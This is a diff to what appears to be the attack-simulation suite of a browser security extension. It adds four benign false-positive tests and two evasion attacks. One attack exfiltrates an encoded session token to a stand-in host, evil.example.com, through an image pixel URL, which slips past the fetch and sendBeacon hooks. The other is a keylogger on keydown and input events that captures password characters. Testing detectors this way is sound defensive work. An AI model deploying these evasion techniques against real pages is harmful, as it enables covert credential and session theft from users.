@@ -3287,6 +3287,296 @@ const attacks: AttackDef[] = [
         }
       }),
   },
+
+  // --------------------------------------------------------------------------
+  // False Positive Bait Tests — legitimate behavior that MUST NOT trigger alerts
+  // --------------------------------------------------------------------------
+  {
+    id: "benign-canvas-rendering",
+    name: "Benign Canvas Rendering",
+    category: "side-channel",
+    description:
+      "Draws a gradient and text on a canvas then exports it as a data URL — normal image-export web-app behavior, not fingerprinting",
+    severity: "low",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          const canvas = document.createElement("canvas");
+          canvas.width = 200;
+          canvas.height = 100;
+          const ctx = canvas.getContext("2d")!;
+
+          // Draw a simple gradient — not a fingerprinting probe
+          const gradient = ctx.createLinearGradient(0, 0, 200, 0);
+          gradient.addColorStop(0, "#4f46e5");
+          gradient.addColorStop(1, "#06b6d4");
+          ctx.fillStyle = gradient;
+          ctx.fillRect(0, 0, 200, 100);
+
+          ctx.fillStyle = "#ffffff";
+          ctx.font = "16px sans-serif";
+          ctx.fillText("Hello, World!", 20, 55);
+
+          const dataUrl = canvas.toDataURL("image/png");
+
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              `BENIGN: canvas gradient+text rendered and exported via toDataURL() — ` +
+              `dataUrl length=${dataUrl.length} — this is normal image-export behavior`,
+          };
+        } catch (error: any) {
+          return {
+            blocked: true,
+            executionTime: performance.now() - startTime,
+            details: `BENIGN: canvas rendering unexpectedly blocked: ${error?.message}`,
+          };
+        }
+      }),
+  },
+  {
+    id: "benign-fetch-api-call",
+    name: "Benign Fetch API Call",
+    category: "network",
+    description:
+      "Makes a normal cross-origin GET request to a public API — standard API integration, no exfiltration payload",
+    severity: "low",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          const response = await fetch("https://httpbin.org/get", {
+            method: "GET",
+            headers: { Accept: "application/json" },
+          });
+          const data = await response.json();
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              `BENIGN: standard cross-origin GET request to httpbin.org/get — ` +
+              `status=${response.status}, origin=${data?.origin ?? "unknown"} — ` +
+              `no sensitive payload, just normal API usage`,
+          };
+        } catch (error: any) {
+          const msg = error?.message ?? String(error);
+          return {
+            blocked: msg.toLowerCase().includes("blocked") || msg.includes("ERR_BLOCKED"),
+            executionTime: performance.now() - startTime,
+            details: `BENIGN: fetch API call failed: ${msg}`,
+          };
+        }
+      }),
+  },
+  {
+    id: "benign-websocket-connection",
+    name: "Benign WebSocket Connection",
+    category: "network",
+    description:
+      "Opens a WebSocket to a legitimate echo server — normal real-time communication, not C2",
+    severity: "low",
+    simulate: (page) =>
+      page.evaluate(() => {
+        const startTime = performance.now();
+        return new Promise<{ blocked: boolean; executionTime: number; details: string }>(
+          (resolve) => {
+            try {
+              const ws = new WebSocket("wss://echo.websocket.org/");
+              let resolved = false;
+              const timeout = setTimeout(() => {
+                if (!resolved) {
+                  resolved = true;
+                  ws.close();
+                  resolve({
+                    blocked: false,
+                    executionTime: performance.now() - startTime,
+                    details:
+                      "BENIGN: WebSocket to echo.websocket.org timed out without error — " +
+                      "connection was allowed (timeout is not a block)",
+                  });
+                }
+              }, 5000);
+              ws.onopen = () => {
+                ws.send("ping");
+              };
+              ws.onmessage = (event) => {
+                if (!resolved) {
+                  resolved = true;
+                  clearTimeout(timeout);
+                  ws.close();
+                  resolve({
+                    blocked: false,
+                    executionTime: performance.now() - startTime,
+                    details:
+                      `BENIGN: WebSocket echo round-trip succeeded — ` +
+                      `received="${String(event.data).substring(0, 40)}" — ` +
+                      `this is legitimate real-time communication`,
+                  });
+                }
+              };
+              ws.onerror = () => {
+                if (!resolved) {
+                  resolved = true;
+                  clearTimeout(timeout);
+                  resolve({
+                    blocked: true,
+                    executionTime: performance.now() - startTime,
+                    details: "BENIGN: WebSocket connection errored — may be a false positive block",
+                  });
+                }
+              };
+            } catch (error: any) {
+              resolve({
+                blocked: true,
+                executionTime: performance.now() - startTime,
+                details: `BENIGN: WebSocket construction threw: ${error?.message}`,
+              });
+            }
+          }
+        );
+      }),
+  },
+  {
+    id: "benign-eval-json-parse",
+    name: "Benign JSON.parse Usage",
+    category: "advanced",
+    description:
+      "Parses a JSON string with JSON.parse() — must not trigger dynamic_code_execution since no eval/Function is involved",
+    severity: "low",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          const jsonString =
+            '{"user":"alice","role":"viewer","preferences":{"theme":"dark","lang":"en"}}';
+          const parsed = JSON.parse(jsonString);
+          const roundTrip = JSON.stringify(parsed);
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              `BENIGN: JSON.parse() + JSON.stringify() round-trip succeeded — ` +
+              `keys=[${Object.keys(parsed).join(", ")}], output length=${roundTrip.length} — ` +
+              `no eval or Function constructor used`,
+          };
+        } catch (error: any) {
+          return {
+            blocked: true,
+            executionTime: performance.now() - startTime,
+            details: `BENIGN: JSON.parse unexpectedly threw: ${error?.message}`,
+          };
+        }
+      }),
+  },
+
+  // --------------------------------------------------------------------------
+  // Real Attacks — designed to evade hooks that are currently in place
+  // --------------------------------------------------------------------------
+  {
+    id: "stealth-exfil-via-image-src",
+    name: "Stealth Exfiltration via Image src",
+    category: "network",
+    description:
+      "Encodes stolen data in the query string of an image pixel URL — bypasses fetch/sendBeacon hooks because Image.src is not intercepted",
+    severity: "high",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          const sensitiveData = btoa(
+            JSON.stringify({ session: "tok_abc123", user: "victim@example.com" })
+          );
+          const exfilUrl = `https://evil.example.com/pixel.gif?d=${encodeURIComponent(sensitiveData)}`;
+
+          await new Promise<void>((resolve) => {
+            const img = new Image();
+            img.onload = () => resolve();
+            img.onerror = () => resolve(); // network error expected in test env; what matters is src was set
+            img.src = exfilUrl;
+            // Force resolve after short timeout in case neither fires
+            setTimeout(resolve, 2000);
+          });
+
+          return {
+            blocked: false,
+            executionTime: performance.now() - startTime,
+            details:
+              `Stealth exfiltration via Image.src succeeded — ` +
+              `encoded payload sent to ${exfilUrl.substring(0, 60)}... — ` +
+              `Image.src is not hooked by the extension, bypassing fetch/sendBeacon interceptors`,
+          };
+        } catch (error: any) {
+          return {
+            blocked: true,
+            executionTime: performance.now() - startTime,
+            details: `Image-src exfiltration blocked: ${error?.message}`,
+          };
+        }
+      }),
+  },
+  {
+    id: "stealth-keylogger-via-input-events",
+    name: "Stealth Keylogger via Input Events",
+    category: "privacy",
+    description:
+      "Attaches 'input' and 'keydown' listeners to document to capture keystrokes — " +
+      "addEventListener hook only guards devicemotion/orientation/clipboard/drag/selection events, not 'input' or 'keydown'",
+    severity: "critical",
+    simulate: (page) =>
+      page.evaluate(async () => {
+        const startTime = performance.now();
+        try {
+          const captured: string[] = [];
+
+          const onKeydown = (e: KeyboardEvent) => {
+            captured.push(`keydown:${e.key}`);
+          };
+          const onInput = (e: Event) => {
+            const target = e.target as HTMLInputElement | null;
+            if (target?.value) captured.push(`input:${target.value.slice(-1)}`);
+          };
+
+          document.addEventListener("keydown", onKeydown);
+          document.addEventListener("input", onInput);
+
+          // Simulate typed keystrokes programmatically
+          const input = document.createElement("input");
+          input.type = "password";
+          document.body.appendChild(input);
+          input.focus();
+
+          const keys = ["p", "a", "s", "s", "w", "0", "r", "d"];
+          for (const key of keys) {
+            input.value += key;
+            document.dispatchEvent(new KeyboardEvent("keydown", { key, bubbles: true }));
+            input.dispatchEvent(new Event("input", { bubbles: true }));
+          }
+
+          document.removeEventListener("keydown", onKeydown);
+          document.removeEventListener("input", onInput);
+          document.body.removeChild(input);
+
+          return {
+            blocked: captured.length === 0,
+            executionTime: performance.now() - startTime,
+            details:
+              captured.length > 0
+                ? `Keylogger captured ${captured.length} event(s) — ` +
+                  `sample: [${captured.slice(0, 5).join(", ")}] — ` +
+                  `'input' and 'keydown' addEventListener calls are not blocked by the extension`
+                : "Keylogger blocked: no events captured",
+          };
+        } catch (error: any) {
+          return {
+            blocked: true,
+            executionTime: performance.now() - startTime,
+            details: `Keylogger blocked: ${error?.message}`,
+          };
+        }
+      }),
+  },
 ];
 
 // ============================================================================
